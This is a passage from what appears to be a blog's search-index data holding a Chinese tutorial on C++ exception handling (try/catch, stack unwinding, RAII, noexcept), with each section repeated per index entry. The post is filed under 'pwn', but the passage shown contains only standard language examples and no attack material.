cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#基础语法"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#trycatch"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#函数退出与栈展开"},{"categories":["pwn"],"collections":null,"content":"基础语法\r异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch\rtry { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开\r在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAII\rC异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，**现代 C 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）**： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#raii"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#高级异常机制"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#对象销毁"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#析构函数与异常"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#throw"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch 